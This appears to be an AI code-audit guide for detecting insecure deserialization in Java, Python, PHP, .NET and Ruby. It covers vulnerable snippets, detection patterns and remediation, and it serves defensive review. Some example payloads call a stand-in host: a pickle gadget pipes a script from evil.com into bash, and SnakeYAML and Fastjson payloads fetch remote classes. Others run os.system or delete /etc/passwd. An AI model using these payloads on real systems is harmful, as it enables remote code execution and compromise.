<!-- Adapted audit reference. Apply its vulnerability-specific checks through the Codex-native BALLS workflow and evidence rules. -->

# Insecure Deserialization Detection Skill

## Overview

## ⚠️ Mandatory: Concrete Data Flow Proof Required

**DO NOT report a finding based on pattern-matching alone.** For every potential vulnerability you identify:

1. **Find the SINK** (dangerous function/API call)
2. **Trace all callers** — use `codegraph callers <symbol>` or `codegraph explore "<flow question>"` to identify call sites and execution paths.
3. **For each caller, trace the argument origin**:
   - Hardcoded/constant value → **Skip** (not a vulnerability, just bad practice)
   - Config file / admin-only source → **Skip** (not exploitable from internet)
   - User-controlled input (HTTP request, RPC, file upload, etc.) → **Investigate further**
   - Another service / database → **Trace upstream** to find the ultimate source
4. **Document the complete path**: SOURCE (file:line) → INTERMEDIATES (file:line each) → SINK (file:line)
5. **Verify no sanitization** between source and sink that would prevent exploitation

**"If an attacker controls X" is NOT a valid finding. You must prove X is user-controlled by tracing the actual code.**

Deserialization is the process of reconstructing an object from a serialized byte stream or
string representation. Insecure deserialization occurs when an application deserializes data
from an untrusted source without adequate validation, allowing attackers to manipulate the
serialized payload to achieve malicious outcomes.

### Why Deserialization Is Dangerous

Insecure deserialization is classified under **OWASP Top 10 A08:2021 — Software and Data
Integrity Failures**. It is one of the most severe vulnerability classes because exploitation
can lead to:

- **Remote Code Execution (RCE)**: Attackers craft serialized payloads that, when deserialized,
  trigger arbitrary code execution on the server. This is the most critical outcome and is
  achievable in most languages that support native object serialization.
- **Denial of Service (DoS)**: Malicious payloads can cause infinite loops, excessive memory
  allocation, or CPU-intensive operations during deserialization.
- **Authentication Bypass**: Manipulating serialized session tokens or authentication objects
  to escalate privileges or impersonate other users.
- **Injection Attacks**: Deserialized objects may be used in SQL queries, LDAP lookups, or
  OS commands, leading to secondary injection vulnerabilities.
- **Object/Data Tampering**: Modifying serialized data to change application state, prices,
  roles, or other business-critical values.

### How Gadget Chains Work

A "gadget chain" is a sequence of existing classes in the application's classpath (or its
dependencies) that, when deserialized in a specific order, achieve a malicious effect such as
code execution. The attacker does NOT need to inject new code — they simply arrange existing
code (gadgets) so that the deserialization process triggers a chain of method calls leading
to the desired effect.

**Example chain**: A serialized `HashMap` triggers `hashCode()` on an entry → the entry's
`hashCode()` calls `equals()` on a `TiedMapEntry` → which calls `getValue()` on a
`LazyMap` → which calls `transform()` on a `ChainedTransformer` → which invokes
`Runtime.getRuntime().exec("malicious command")`.

Tools like **ysoserial** (Java), **phpggc** (PHP), and **marshal** payloads (Ruby) automate
gadget chain generation for known libraries.

---

## Vulnerability Patterns

### 1. Java Deserialization

Java's native serialization (`ObjectInputStream`) is the most extensively researched
deserialization attack surface. Any class on the classpath that implements `Serializable`
can be instantiated during deserialization.

#### Dangerous Patterns

```java
// VULNERABLE: Reading ObjectInputStream from untrusted source
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject(); // Arbitrary class instantiation

// VULNERABLE: Deserializing from a file uploaded by user
FileInputStream fis = new FileInputStream(uploadedFile);
ObjectInputStream ois = new ObjectInputStream(fis);
Object data = ois.readObject();

// VULNERABLE: Deserializing from message queue without validation
byte[] message = rabbitMQChannel.basicGet(queueName, true).getBody();
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(message));
Object payload = ois.readObject();

// VULNERABLE: readUnshared is equally dangerous
Object obj = ois.readUnshared();

// VULNERABLE: Custom readResolve can be abused
private Object readResolve() throws ObjectStreamException {
    return instance; // Can be manipulated
}
```

#### XMLDecoder

```java
// VULNERABLE: XMLDecoder processes arbitrary method calls
XMLDecoder decoder = new XMLDecoder(new BufferedInputStream(request.getInputStream()));
Object result = decoder.readObject(); // Can execute arbitrary methods
decoder.close();
```

#### Jackson Polymorphic Type Handling

```java
// VULNERABLE: enableDefaultTyping allows arbitrary class instantiation
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(); // DANGEROUS — allows any class
Object value = mapper.readValue(userInput, Object.class);

// VULNERABLE: @JsonTypeInfo with Id.CLASS
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.PROPERTY, property = "@class")
public class Message {
    public Object payload; // Attacker controls the class via @class property
}

// VULNERABLE: @JsonTypeInfo with Id.MINIMAL_CLASS
@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)
public abstract class BaseEvent { }
```

#### Vulnerable Libraries

- **Apache Commons Collections**: `InvokerTransformer`, `InstantiateTransformer`, `ChainedTransformer`
- **Spring Framework**: `MethodInvokeTypeProvider`, `ObjectFactoryDelegatingInvocationHandler`
- **Apache Commons BeanUtils**: `BeanComparator`
- **Hibernate**: `HibernateProxy` gadgets
- **Groovy**: `MethodClosure`, `ConvertedClosure`
- **JBoss/WildFly**: Various MBean gadgets

#### Detection grep patterns

```
ObjectInputStream
\.readObject\(
\.readUnshared\(
XMLDecoder
enableDefaultTyping
JsonTypeInfo\.Id\.CLASS
JsonTypeInfo\.Id\.MINIMAL_CLASS
@JsonTypeInfo
defaultTyping
```

---

### 2. Python pickle / shelve / marshal

Python's `pickle` module can execute arbitrary code during deserialization via the
`__reduce__` method. There is NO safe way to deserialize untrusted pickle data.

#### Dangerous Patterns

```python
# VULNERABLE: pickle.loads with user-controlled data
import pickle
data = request.get_data()
obj = pickle.loads(data)  # Arbitrary code execution

# VULNERABLE: pickle.load from untrusted file
with open(uploaded_file, 'rb') as f:
    obj = pickle.load(f)  # Arbitrary code execution

# VULNERABLE: shelve uses pickle internally
import shelve
db = shelve.open(user_provided_path)  # Reads pickle data

# VULNERABLE: marshal.loads — less common but still dangerous
import marshal
code = marshal.loads(user_data)

# VULNERABLE: cPickle (Python 2) is equally dangerous
import cPickle
obj = cPickle.loads(user_input)
```

#### __reduce__ Exploitation

```python
# Attacker payload — executes os.system("malicious command")
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl http://evil.com/shell.sh | bash",))

payload = pickle.dumps(Exploit())
# When victim calls pickle.loads(payload), the command executes
```

#### PyYAML Unsafe Loading

```python
# VULNERABLE: yaml.load without SafeLoader allows arbitrary Python objects
import yaml
data = yaml.load(user_input)  # Default Loader is unsafe in PyYAML < 6.0

# VULNERABLE: yaml.load with FullLoader still has known gadgets
data = yaml.load(user_input, Loader=yaml.FullLoader)

# VULNERABLE: yaml.unsafe_load is explicitly unsafe
data = yaml.unsafe_load(user_input)

# SAFE: Always use safe_load
data = yaml.safe_load(user_input)  # Only loads basic Python types
```

#### Detection grep patterns

```
pickle\.loads
pickle\.load\(
cPickle\.loads
cPickle\.load\(
shelve\.open
marshal\.loads
yaml\.load\(
yaml\.unsafe_load
yaml\.full_load
```

---

### 3. PHP unserialize

PHP's `unserialize()` instantiates objects and invokes magic methods, enabling
Property-Oriented Programming (POP) chains.

#### Dangerous Patterns

```php
// VULNERABLE: unserialize with user-controlled data
$data = unserialize($_GET['data']); // Arbitrary object instantiation

// VULNERABLE: unserialize from cookie
$session = unserialize($_COOKIE['session']);

// VULNERABLE: unserialize from POST body
$obj = unserialize(file_get_contents('php://input'));

// VULNERABLE: unserialize from database (if attacker can write to DB)
$row = $db->query("SELECT data FROM cache WHERE key = ?")->fetch();
$obj = unserialize($row['data']);
```

#### Magic Methods Exploited in POP Chains

- `__wakeup()` — Called immediately when object is deserialized
- `__destruct()` — Called when object is garbage collected (guaranteed execution)
- `__toString()` — Called when object is cast to string
- `__call()` — Called when invoking an inaccessible method
- `__get()` / `__set()` — Called on inaccessible property access
- `__invoke()` — Called when using object as a function

```php
// Example: POP chain using __destruct
class FileManager {
    public $file;
    public function __destruct() {
        unlink($this->file); // Arbitrary file deletion
    }
}

// Attacker crafts: O:11:"FileManager":1:{s:4:"file";s:11:"/etc/passwd";}
```

#### Phar Deserialization

```php
// VULNERABLE: phar:// stream wrapper triggers deserialization of metadata
$info = file_get_contents('phar://' . $userInput);
$exists = file_exists('phar://' . $userInput);
$info = getimagesize('phar://' . $userInput);

// Any file operation with phar:// prefix can trigger deserialization
// of the phar manifest metadata without calling unserialize()
```

#### Detection grep patterns

```
unserialize\(
phar://
__wakeup
__destruct
__toString
```

---

### 4. .NET BinaryFormatter / Related Serializers

Microsoft has officially deprecated `BinaryFormatter` due to its inherent security risks.
It cannot be made safe regardless of configuration.

#### Dangerous Patterns

```csharp
// VULNERABLE: BinaryFormatter — deprecated and inherently dangerous
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(requestStream); // RCE possible

// VULNERABLE: NetDataContractSerializer
NetDataContractSerializer serializer = new NetDataContractSerializer();
object obj = serializer.ReadObject(stream);

// VULNERABLE: SoapFormatter
SoapFormatter formatter = new SoapFormatter();
object obj = formatter.Deserialize(stream);

// VULNERABLE: LosFormatter (used in ViewState)
LosFormatter formatter = new LosFormatter();
object obj = formatter.Deserialize(viewStateString);

// VULNERABLE: ObjectStateFormatter (used internally by LosFormatter)
ObjectStateFormatter formatter = new ObjectStateFormatter();
object obj = formatter.Deserialize(data);
```

#### Newtonsoft.Json (Json.NET) TypeNameHandling

```csharp
// VULNERABLE: TypeNameHandling.All — includes type info for all objects
JsonConvert.DeserializeObject<object>(userInput, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All // DANGEROUS
});

// VULNERABLE: TypeNameHandling.Auto — includes type info when needed
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.Auto // Still dangerous with Object members
};

// VULNERABLE: TypeNameHandling.Objects
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.Objects
};

// SAFE: TypeNameHandling.None (default)
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.None
};
```

#### JavaScriptSerializer with SimpleTypeResolver

```csharp
// VULNERABLE: SimpleTypeResolver allows arbitrary type resolution
JavaScriptSerializer ser = new JavaScriptSerializer(new SimpleTypeResolver());
object obj = ser.Deserialize<object>(userInput); // RCE possible
```

#### XmlSerializer with User-Controlled Type

```csharp
// VULNERABLE: Type controlled by user input
string typeName = Request.QueryString["type"];
Type t = Type.GetType(typeName);
XmlSerializer serializer = new XmlSerializer(t); // Arbitrary type instantiation
object obj = serializer.Deserialize(stream);

// SAFE: XmlSerializer with hardcoded type
XmlSerializer serializer = new XmlSerializer(typeof(MyKnownClass));
```

#### Detection grep patterns

```
BinaryFormatter
NetDataContractSerializer
SoapFormatter
LosFormatter
ObjectStateFormatter
TypeNameHandling
SimpleTypeResolver
\.Deserialize\(
```

---

### 5. Ruby Marshal

Ruby's `Marshal.load` can instantiate arbitrary objects, enabling code execution through
carefully crafted payloads.

#### Dangerous Patterns

```ruby
# VULNERABLE: Marshal.load with untrusted data
data = request.body.read
obj = Marshal.load(data) # Arbitrary object instantiation, RCE possible

# VULNERABLE: Marshal.load from cookie
obj = Marshal.load(Base64.decode64(cookies[:session]))

# VULNERABLE: Marshal.restore is an alias for Marshal.load
obj = Marshal.restore(untrusted_data)
```

#### Ruby YAML (Psych)

```ruby
# VULNERABLE: YAML.load allows Ruby object instantiation via tags
data = YAML.load(user_input) # Can instantiate arbitrary Ruby objects

# VULNERABLE: ERB template in YAML enables code execution
# Payload: "--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y"

# SAFE: YAML.safe_load restricts to basic types
data = YAML.safe_load(user_input)

# SAFE in Ruby 3.1+: YAML.load requires permitted_classes
data = YAML.load(user_input, permitted_classes: [Symbol, Date])
```

#### JSON with create_additions

```ruby
# VULNERABLE: JSON.parse with create_additions enables object instantiation
data = JSON.parse(user_input, create_additions: true)

# SAFE: Default JSON.parse (create_additions: false since Ruby 2.4)
data = JSON.parse(user_input)
```

#### Detection grep patterns

```
Marshal\.load
Marshal\.restore
YAML\.load\(
JSON\.parse.*create_additions
```

---

### 6. YAML Deserialization (Cross-Language)

YAML deserialization is dangerous across multiple languages because the YAML specification
supports language-specific type tags that can instantiate arbitrary objects.

#### SnakeYAML (Java)

```java
// VULNERABLE: Default SnakeYAML constructor allows arbitrary Java objects
Yaml yaml = new Yaml();
Object data = yaml.load(userInput); // Attacker uses !!javax.script.ScriptEngineManager

// The !! tag in YAML specifies a type:
// Payload: "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil.com/exploit.jar\"]]]]"

// SAFE: Use SafeConstructor
Yaml yaml = new Yaml(new SafeConstructor());
Object data = yaml.load(userInput); // Only allows basic types
```

#### PyYAML (Python)

```python
# VULNERABLE: yaml.load without explicit safe Loader
# Payload: "!!python/object/apply:os.system ['whoami']"
data = yaml.load(user_input)

# SAFE: yaml.safe_load
data = yaml.safe_load(user_input)
```

#### Detection grep patterns

```
new Yaml\(\)
yaml\.load\(
Yaml\(\)\.load
SafeConstructor  # Positive indicator — used to confirm safe usage
```

---

### 7. XML Deserialization

#### XStream (Java)

```java
// VULNERABLE: XStream without security framework (pre-1.4.17)
XStream xstream = new XStream();
Object obj = xstream.fromXML(userInput); // RCE via crafted XML

// SAFER: XStream with allowlist (1.4.17+)
XStream xstream = new XStream();
xstream.addPermission(NoTypePermission.NONE);
xstream.addPermission(NullPermission.NULL);
xstream.allowTypes(new Class[] { MyClass.class });
```

#### XXE During Deserialization

```java
// VULNERABLE: XMLInputFactory without disabling external entities
XMLInputFactory factory = XMLInputFactory.newFactory();
// Missing: factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
XMLStreamReader reader = factory.createXMLStreamReader(userInputStream);
```

#### Detection grep patterns

```
XStream
fromXML\(
XMLDecoder
XMLInputFactory
```

---

### 8. JSON with Type Information

#### Fastjson (Java)

```java
// VULNERABLE: Fastjson autoType allows arbitrary class loading
// Payload: {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/Exploit","autoCommit":true}
Object obj = JSON.parseObject(userInput);

// VULNERABLE: Even with autoType "disabled", bypasses exist in older versions
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

#### Detection grep patterns

```
JSON\.parseObject
autoType
fastjson
setAutoTypeSupport
```

---

## Detection Methodology

Follow this systematic approach when scanning for insecure deserialization:

### Step 1: Identify the Technology Stack

Determine the primary languages and frameworks in the codebase to focus detection efforts.

```
# Check for Java
glob pattern: **/*.java
glob pattern: **/pom.xml
glob pattern: **/build.gradle

# Check for Python
glob pattern: **/*.py
glob pattern: **/requirements.txt

# Check for PHP
glob pattern: **/*.php
glob pattern: **/composer.json

# Check for .NET
glob pattern: **/*.cs
glob pattern: **/*.csproj

# Check for Ruby
glob pattern: **/*.rb
glob pattern: **/Gemfile
```

### Step 2: Scan for Dangerous Deserialization Functions

Run targeted grep searches based on the identified technology stack.

**Java deserialization sinks:**
```
grep pattern: ObjectInputStream
grep pattern: \.readObject\(
grep pattern: \.readUnshared\(
grep pattern: XMLDecoder
grep pattern: XStream
grep pattern: \.fromXML\(
grep pattern: enableDefaultTyping
grep pattern: JsonTypeInfo
grep pattern: new Yaml\(\)
grep pattern: JSON\.parseObject
grep pattern: autoType
```

**Python deserialization sinks:**
```
grep pattern: pickle\.loads
grep pattern: pickle\.load\b
grep pattern: cPickle
grep pattern: yaml\.load\(
grep pattern: yaml\.unsafe_load
grep pattern: shelve\.open
grep pattern: marshal\.loads
grep pattern: jsonpickle
```

**PHP deserialization sinks:**
```
grep pattern: unserialize\(
grep pattern: phar://
```

**.NET deserialization sinks:**
```
grep pattern: BinaryFormatter
grep pattern: NetDataContractSerializer
grep pattern: SoapFormatter
grep pattern: LosFormatter
grep pattern: ObjectStateFormatter
grep pattern: TypeNameHandling
grep pattern: SimpleTypeResolver
grep pattern: JavaScriptSerializer
```

**Ruby deserialization sinks:**
```
grep pattern: Marshal\.load
grep pattern: Marshal\.restore
grep pattern: YAML\.load\b
grep pattern: create_additions
```

### Step 3: Trace Data Flow from Sources to Sinks

For each deserialization call found, trace backward to determine if the data originates
from an untrusted source. Check whether the serialized data comes from:

- HTTP request parameters, headers, body, or cookies
- WebSocket messages
- Message queue consumers (RabbitMQ, Kafka, ActiveMQ, SQS)
- Redis cache reads
- File uploads or user-specified file paths
- Database BLOB/binary columns (if attacker can write to the DB)
- Inter-service communication without authentication

### Step 4: Check for Mitigations

Verify whether any of the following mitigations are in place:

- **Java**: `ObjectInputFilter` (JEP 290), serialization allow-lists, look-ahead deserialization
- **Jackson**: `PolymorphicTypeValidator`, `activateDefaultTyping` with validator
- **Python**: Use of `yaml.safe_load()`, `json.loads()` instead of `pickle`
- **.NET**: `TypeNameHandling.None`, `SerializationBinder` with allow-list
- **SnakeYAML**: `SafeConstructor`
- **XStream**: `addPermission()` / `allowTypes()` configuration
- **PHP**: `allowed_classes` parameter in `unserialize()`

### Step 5: Assess Exploitability

Evaluate each finding for exploitability by considering:

1. Can an attacker control the serialized data?
2. Are known gadget chain libraries present on the classpath/include path?
3. Is the deserialization reachable from an unauthenticated endpoint?
4. Are there network egress restrictions that would limit exploitation?

---

## Common Sinks and Sources

### Sources (Where Untrusted Serialized Data Enters)

| Source                  | Risk Level | Notes                                              |
|-------------------------|------------|----------------------------------------------------|
| HTTP request body       | Critical   | Direct user control over serialized payload        |
| HTTP cookies            | Critical   | Especially serialized session objects               |
| HTTP headers            | High       | Custom headers carrying serialized data             |
| Query parameters        | High       | Base64-encoded serialized data in URLs              |
| WebSocket messages      | High       | Real-time channels with serialized payloads         |
| Message queues          | High       | RabbitMQ, Kafka, ActiveMQ, SQS, Redis Pub/Sub      |
| Redis cache             | Medium     | If attacker can poison cache entries                |
| File uploads            | High       | User-uploaded files containing serialized data      |
| Database BLOB columns   | Medium     | If attacker has write access to the database        |
| Inter-service RPC       | Medium     | Java RMI, .NET Remoting, gRPC with Any types        |
| ViewState (.NET)        | High       | ASP.NET ViewState uses LosFormatter                 |

### Sinks (Where Deserialization Occurs)

| Language | Sink Function/Class                  | Severity |
|----------|--------------------------------------|----------|
| Java     | `ObjectInputStream.readObject()`     | Critical |
| Java     | `ObjectInputStream.readUnshared()`   | Critical |
| Java     | `XMLDecoder.readObject()`            | Critical |
| Java     | `XStream.fromXML()`                  | Critical |
| Java     | `Yaml.load()` (SnakeYAML)           | Critical |
| Java     | `JSON.parseObject()` (Fastjson)      | Critical |
| Java     | Jackson with `enableDefaultTyping()` | High     |
| Python   | `pickle.loads()` / `pickle.load()`   | Critical |
| Python   | `yaml.load()` (without SafeLoader)   | Critical |
| Python   | `shelve.open()`                      | High     |
| Python   | `marshal.loads()`                    | High     |
| PHP      | `unserialize()`                      | Critical |
| PHP      | `phar://` stream operations          | High     |
| .NET     | `BinaryFormatter.Deserialize()`      | Critical |
| .NET     | `NetDataContractSerializer`          | Critical |
| .NET     | `SoapFormatter.Deserialize()`        | Critical |
| .NET     | `LosFormatter.Deserialize()`         | Critical |
| .NET     | `ObjectStateFormatter.Deserialize()` | High     |
| .NET     | Json.NET with `TypeNameHandling`     | High     |
| .NET     | `JavaScriptSerializer` + resolver    | High     |
| Ruby     | `Marshal.load()`                     | Critical |
| Ruby     | `YAML.load()`                        | Critical |
| Ruby     | `JSON.parse(create_additions: true)` | High     |

---

## False Positive Indicators

Not every deserialization call is exploitable. Mark as **false positive** or **low risk** when:

### Trusted Data Sources
- The serialized data originates exclusively from an internal, authenticated, and trusted
  service (e.g., internal microservice-to-microservice communication over mTLS).
- The data is generated and consumed by the same application with no external input path.
- Data is read from a local configuration file deployed with the application (not user-uploaded).

### Type Filtering / Allow-Listing Configured
- **Java `ObjectInputFilter`** (JEP 290): A filter is configured that restricts which classes
  can be deserialized. Verify the filter is actually restrictive (not permissive wildcard).
  ```java
  ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("com.myapp.**;!*");
  ois.setObjectInputFilter(filter);
  ```
- **Jackson `PolymorphicTypeValidator`**: A validator is configured that restricts allowed types.
  ```java
  ObjectMapper mapper = new ObjectMapper();
  mapper.activateDefaultTyping(
      BasicPolymorphicTypeValidator.builder()
          .allowIfSubType("com.myapp.dto.")
          .build(),
      ObjectMapper.DefaultTyping.NON_FINAL
  );
  ```
- **PHP `unserialize()` with `allowed_classes`**: Restricts which classes can be instantiated.
  ```php
  $data = unserialize($input, ['allowed_classes' => ['AllowedClass']]);
  ```
- **XStream with security framework**: Allow-list of permitted types is configured.

### Safe Alternatives Already in Use
- Application uses `json.loads()` (Python), `JSON.parse()` (Ruby default), or `System.Text.Json`
  (.NET) for data exchange — these do not instantiate arbitrary objects by default.
- Protocol Buffers, MessagePack, FlatBuffers, or Avro used without type-embedding features.
- YAML loaded with `safe_load()`, `SafeConstructor`, or equivalent safe loaders.

### Signed/Encrypted Serialized Data
- The serialized payload is cryptographically signed (HMAC, digital signature) AND the
  signature is verified BEFORE deserialization. Note: if verification happens AFTER
  deserialization, it is still vulnerable.
- The serialized data is encrypted with authenticated encryption (AES-GCM) with proper
  key management.

---

## Severity Assessment

| Factor                                         | Severity  |
|-------------------------------------------------|-----------|
| Untrusted data → native deserialization (Java, Python, PHP, .NET, Ruby) | **Critical** |
| Known gadget chain libraries on classpath       | **Critical** |
| Reachable from unauthenticated endpoint         | **Critical** |
| JSON/YAML deserializer with type handling enabled and untrusted input | **High** |
| Deserialization behind authentication            | **High**  |
| Limited gadget chain availability                | **High**  |
| Deserialization of semi-trusted data (internal service, no mTLS) | **Medium** |
| Type filtering configured but overly permissive  | **Medium** |
| Deserialization of trusted data with weak integrity checks | **Medium** |
| Deserialization with strict allow-list but large attack surface | **Low** |
| Safe deserializer (json, protobuf) without type handling | **Info** |

### Scoring Guidance

- **Critical (CVSS 9.0–10.0)**: Unauthenticated RCE via deserialization of untrusted data
  with known gadget chains available. Immediate remediation required.
- **High (CVSS 7.0–8.9)**: Authenticated RCE, or unauthenticated deserialization without
  confirmed gadget chains but with dangerous libraries present.
- **Medium (CVSS 4.0–6.9)**: Deserialization of semi-trusted data, or dangerous deserializer
  with partial mitigations in place.
- **Low (CVSS 0.1–3.9)**: Deserialization with strong mitigations (allow-list, signatures)
  but suboptimal implementation.

---

## Remediation Patterns

### General Principle

**Never deserialize untrusted data with unsafe deserializers.** If you must accept structured
data from untrusted sources, use format-specific parsers that do not instantiate arbitrary
objects.

### Safe Alternatives (Preferred)

| Instead Of                     | Use                                          |
|--------------------------------|----------------------------------------------|
| Java `ObjectInputStream`       | JSON (Jackson/Gson), Protocol Buffers, Avro  |
| Python `pickle`                | `json.loads()`, MessagePack, Protocol Buffers|
| PHP `unserialize()`            | `json_decode()`, MessagePack                 |
| .NET `BinaryFormatter`         | `System.Text.Json`, Protocol Buffers         |
| Ruby `Marshal.load`            | `JSON.parse()`, MessagePack                  |
| YAML unsafe load               | `yaml.safe_load()` / `SafeConstructor`       |

### Java Remediation

```java
// 1. Use ObjectInputFilter (JEP 290, Java 9+, backported to 8u121+)
ObjectInputStream ois = new ObjectInputStream(stream);
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.dto.AllowedClass;com.myapp.dto.AnotherClass;!*"
);
ois.setObjectInputFilter(filter);

// 2. Use look-ahead deserialization (Apache Commons IO)
// ValidatingObjectInputStream checks classes before deserializing
ValidatingObjectInputStream vois = new ValidatingObjectInputStream(stream);
vois.accept(AllowedClass.class, AnotherClass.class);
Object obj = vois.readObject();

// 3. Jackson: Use PolymorphicTypeValidator instead of enableDefaultTyping
ObjectMapper mapper = new ObjectMapper();
mapper.activateDefaultTyping(
    BasicPolymorphicTypeValidator.builder()
        .allowIfBaseType("com.myapp.")
        .build(),
    ObjectMapper.DefaultTyping.NON_FINAL
);

// 4. SnakeYAML: Use SafeConstructor
Yaml yaml = new Yaml(new SafeConstructor());

// 5. XStream: Configure security framework
XStream xstream = new XStream();
xstream.addPermission(NoTypePermission.NONE);
xstream.allowTypes(new Class[] { SafeClass.class });
```

### Python Remediation

```python
# 1. Replace pickle with JSON
import json
data = json.loads(user_input)  # Safe — only basic types

# 2. Use yaml.safe_load instead of yaml.load
import yaml
data = yaml.safe_load(user_input)  # Only basic YAML types

# 3. If pickle is absolutely required, use hmac signing
import hmac, hashlib, pickle

SECRET_KEY = b'server-secret-key'

def safe_serialize(obj):
    data = pickle.dumps(obj)
    signature = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()
    return signature + '|' + data.hex()

def safe_deserialize(signed_data):
    signature, hex_data = signed_data.split('|', 1)
    data = bytes.fromhex(hex_data)
    expected = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Invalid signature — data tampered")
    return pickle.loads(data)  # Only after signature verification
```

### .NET Remediation

```csharp
// 1. Replace BinaryFormatter with System.Text.Json
using System.Text.Json;
var obj = JsonSerializer.Deserialize<MyClass>(userInput);

// 2. If Json.NET is required, ensure TypeNameHandling.None
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.None // Default and safe
};
var obj = JsonConvert.DeserializeObject<MyClass>(userInput, settings);

// 3. If TypeNameHandling is needed, use SerializationBinder
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.Auto,
    SerializationBinder = new AllowListBinder(
        typeof(SafeClass), typeof(AnotherSafeClass)
    )
};

// 4. For ASP.NET ViewState, ensure MAC validation is enabled
// In web.config:
// <pages enableViewStateMac="true" />
// <machineKey validation="HMACSHA256" />
```

### PHP Remediation

```php
// 1. Replace unserialize with json_decode
$data = json_decode($userInput, true); // Safe — only basic types

// 2. If unserialize is required, restrict allowed classes
$data = unserialize($input, ['allowed_classes' => false]); // No objects
$data = unserialize($input, ['allowed_classes' => ['SafeClass']]); // Allow-list

// 3. Disable phar:// stream wrapper if not needed
// In php.ini: allow_url_fopen = Off
// Or use stream_wrapper_unregister('phar');
```

### Ruby Remediation

```ruby
# 1. Use JSON.parse instead of Marshal.load
data = JSON.parse(user_input) # Safe — only basic types

# 2. Use YAML.safe_load instead of YAML.load
data = YAML.safe_load(user_input)

# 3. In Ruby 3.1+, YAML.load requires permitted_classes
data = YAML.load(user_input, permitted_classes: [Symbol, Date, Time])
```

### Defense-in-Depth Measures

1. **Network segmentation**: Restrict egress from application servers to prevent
   reverse shells and data exfiltration even if RCE is achieved.
2. **Runtime Application Self-Protection (RASP)**: Deploy RASP agents that monitor
   deserialization calls at runtime and block known gadget chains.
3. **Dependency management**: Keep serialization libraries updated. Many gadget chains
   are patched in newer versions of commons-collections, Spring, etc.
4. **Web Application Firewall (WAF)**: Configure WAF rules to detect serialized Java
   objects (`aced 0005` magic bytes), PHP serialized strings (`O:` prefix), and other
   serialization format signatures in HTTP requests.
5. **Monitoring and alerting**: Log deserialization events and alert on anomalous patterns
   such as unexpected class instantiation or deserialization errors.

---

## CWE References

- **[CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)**:
  The application deserializes untrusted data without sufficiently verifying that the
  resulting data will be valid. This is the primary CWE for all insecure deserialization
  findings.

- **[CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)**:
  The application receives input from an upstream component that specifies attributes to
  be modified in an object, but does not properly limit which attributes can be modified.
  This applies to mass assignment through deserialization where object properties are
  set from serialized data without validation.

### Related CWEs

- **CWE-94: Improper Control of Generation of Code (Code Injection)**: When deserialization
  leads to code execution via gadget chains or `__reduce__` methods.
- **CWE-1321: Improperly Controlled Modification of Object Prototype Attributes (Prototype Pollution)**:
  When JSON deserialization in JavaScript modifies `__proto__` or `constructor.prototype`.
- **CWE-611: Improper Restriction of XML External Entity Reference (XXE)**: When XML
  deserialization processes external entities.

---

## References and Tools

- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [ysoserial — Java deserialization exploit tool](https://github.com/frohoff/ysoserial)
- [phpggc — PHP Generic Gadget Chains](https://github.com/ambionics/phpggc)
- [ysoserial.net — .NET deserialization exploit tool](https://github.com/pwntester/ysoserial.net)
- [marshalsec — Java unmarshalling exploits](https://github.com/mbechler/marshalsec)
- [Alvaro Muñoz & Oleksandr Mirosh — Friday the 13th: JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
